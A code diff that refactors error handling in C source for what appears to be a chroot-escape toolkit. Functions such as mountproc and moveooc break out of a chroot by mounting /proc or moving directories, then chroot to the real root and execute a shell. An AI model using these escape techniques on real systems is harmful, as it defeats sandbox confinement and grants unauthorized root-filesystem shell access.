@@ -137,7 +137,6 @@ int send_fd(int sock, const int fd)
     char nothing = '!';
     struct iovec nothing_ptr;
     struct cmsghdr *cmsg;
-    int i;
 
     nothing_ptr.iov_base = &nothing;
     nothing_ptr.iov_len = 1;
@@ -166,7 +165,6 @@ int recv_fd(int sock, int *fd)
     char nothing;
     struct iovec nothing_ptr;
     struct cmsghdr *cmsg;
-    int i;
 
     nothing_ptr.iov_base = &nothing;
     nothing_ptr.iov_len = 1;
@@ -338,7 +336,7 @@ int classic(char *dir) {
 
 #if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && !__NetBSD__
 int classicfd(char *dir) {
-    int err, i, fd;
+    int err, i;
     struct stat dirstat;
     DIR *dird;
     
@@ -606,12 +604,13 @@ int uds(char *dir)
         !__APPLE__ && !__NetBSD__
 int mountproc(char *dir) 
 {
-    int err, i, fd;
+    int err, i;
     pid_t pid;
     struct stat ownstat, otherstat;
     DIR *dird;
     struct dirent *pdirent;
     char *rootname; // "/proc/$pid$/root"
+    int return_code = 0xDEADBEEF;
 #if __sun
     char optbuf[0x400];
     char slashdir[255];
@@ -621,7 +620,7 @@ int mountproc(char *dir)
     if ((rootname = malloc(8+sizeof(unsigned long long)+strlen(dir))) == NULL)
     {
 	printf("[-] Error allocating memory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     memset(rootname, 0, 8+sizeof(unsigned long long)+strlen(dir));
     sprintf(rootname, "/%s/%llu/root", dir, (unsigned long long)pid);
@@ -633,7 +632,7 @@ int mountproc(char *dir)
 	if (mkdir(dir, 0555))
 	{
 	    printf("[-] error creating %s\n", dir);
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
     }
     
@@ -650,29 +649,28 @@ int mountproc(char *dir)
 #endif
 	{
 	    printf("[-] error mounting %s: %s\n", dir, strerror(errno));
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	if ((err = stat(rootname, &ownstat)) != 0) 
 	{
 	    printf("[-] cannot find my own root: %s\n", strerror(errno));
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
     }
 
     if ((dird = opendir(dir)) == NULL)
     {
 	printf("[-] error opening %s: %s\n", dir, strerror(errno));
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     while ((pdirent = readdir(dird)) != NULL)
     {
-	i = 12 + strlen(pdirent->d_name);
 	if ((rootname = realloc(rootname, 
 	    8+strlen(dir)+strlen(pdirent->d_name))) == NULL)
 	{
 	    printf("[-] Error reallocating memory\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	sprintf(rootname, "/%s/%s/root", dir, pdirent->d_name);
 	if ((strncmp(pdirent->d_name, ".", 1)) && 
@@ -690,30 +688,34 @@ int mountproc(char *dir)
     if (fchdir(dirfd(dird)))
     {
 	printf("[-] cannot change directory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 	
     printf("[+] chrooting to real root\n");
     if (chroot("."))
     {
 	printf("[-] chroot failed\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     
-    free(rootname);
     for (i=0; i<SHELLNUM; i++)
     {
 	if ((err = stat(shells[i], &ownstat)) == 0)
 	{
 #if !__sun
-            return execve(shells[i], NULL, NULL);
+            return_code = execve(shells[i], NULL, NULL);
 #else
-            return execl(shells[i], NULL, NULL);
+            return_code = execl(shells[i], NULL, NULL);
 #endif
+	    goto safe_exit;
 	}
     }
 
-    return 0;
+    return_code = 0;
+
+safe_exit:
+    if (rootname) free(rootname);
+    return return_code;
 }
 #endif
 
@@ -721,10 +723,8 @@ int mountproc(char *dir)
         !__APPLE__ && !__sun && !__NetBSD__
 int makeblockdevice(char *devdir, char *mountdir)
 {
-    int err, i, j, h, fd;
+    int err, i, j, h;
     struct stat dirstat;
-    DIR *dird;
-    struct dirent *pdirent;
     char *shellname = NULL, *devname = NULL;
     char *filesystems[] = {"ext4", "ext3", "ext2", "zfs",
 	    "ufs", "ufs2" };
@@ -1025,31 +1025,32 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
     struct stat dirstat;
     pid_t pid;
     char *childdir = NULL;
+    int return_value = 0xDEADBEEF;
 
     size = strlen(chrootdir)+strlen(nesteddir)+2;
     if ((childdir = malloc(size)) == NULL)
     {
 	printf("[-] error allocating memory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     snprintf(childdir, size, "%s/%s", chrootdir, nesteddir);
 
     if ((err = stat(chrootdir, &dirstat)) == 0) 
     {
 	printf("[-] %s exists, please remove\n", chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     if ((err = stat(newdir, &dirstat)) == 0)
     {
 	printf("[-] %s exists, please remove\n", newdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     
     printf("[+] creating %s directory\n", chrootdir);
     if (mkdir(chrootdir, 0700))
     {
 	printf("[-] error creating %s\n", chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     printf("[+] creating %s directory\n", childdir);
@@ -1057,7 +1058,7 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
     {
 	printf("[-] error creating %s\n", childdir);
 	rmdir(chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     printf("[+] forking...\n");
@@ -1069,22 +1070,22 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	printf("[+] 0: change working directory to: %s\n", chrootdir);
 	if (chdir(chrootdir) != 0)
 	{
-	    printf("[-] 0: cannot change directory\n");	
-	    return 0xDEADBEEF;
+	    printf("[-] 0: cannot change directory\n");
+	    goto safe_exit;
 	}
 	
 	printf("[+] 0: chrooting to %s\n", chrootdir);
 	if (chroot(".") != 0)
 	{
 	    printf("[-] 0: chroot failed to %s\n", chrootdir);
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	
 	printf("[+] 0: change working directory to: %s\n", nesteddir);
 	if (chdir(nesteddir) != 0)
 	{
 	    printf("[-] 0: cannot change directory\n");	
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 
 	printf("[+] 0: sleeping for 2 seconds\n");
@@ -1094,27 +1095,26 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	if (movetotheroot())
 	{
 	    printf("[-] 0: cannot change directory ../\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 
 	printf("[+] 0: chrooting to real root\n");
 	if (chroot(".") != 0)
 	{
 	    printf("[-] 0: chroot failed\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	
-	free(childdir);
-
 	for (i=0; i<SHELLNUM; i++)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
 #if !__sun
-                return execve(shells[i], NULL, NULL);
+                return_value = execve(shells[i], NULL, NULL);
 #else
-                return execl(shells[i], NULL, NULL);
+                return_value = execl(shells[i], NULL, NULL);
 #endif
+                goto safe_exit;
 	    }
 	}
     }
@@ -1124,11 +1124,13 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	sleep(1);
 	printf("[+] 1: mv %s to %s\n", childdir, newdir);
 	rename(childdir, newdir);
-	
-	return 0;
     }
 
-    return 0;
+    return_value = 0;
+
+safe_exit:
+    if (childdir) free(childdir);
+    return return_value;
 }
 #endif
 
@@ -1142,7 +1144,7 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 #if __linux__
 int fddemo(char *dir)
 {
-    DIR *dird, *dird2;
+    DIR *dird;
     int size, i, fd, err;
     struct stat fdstat;
 
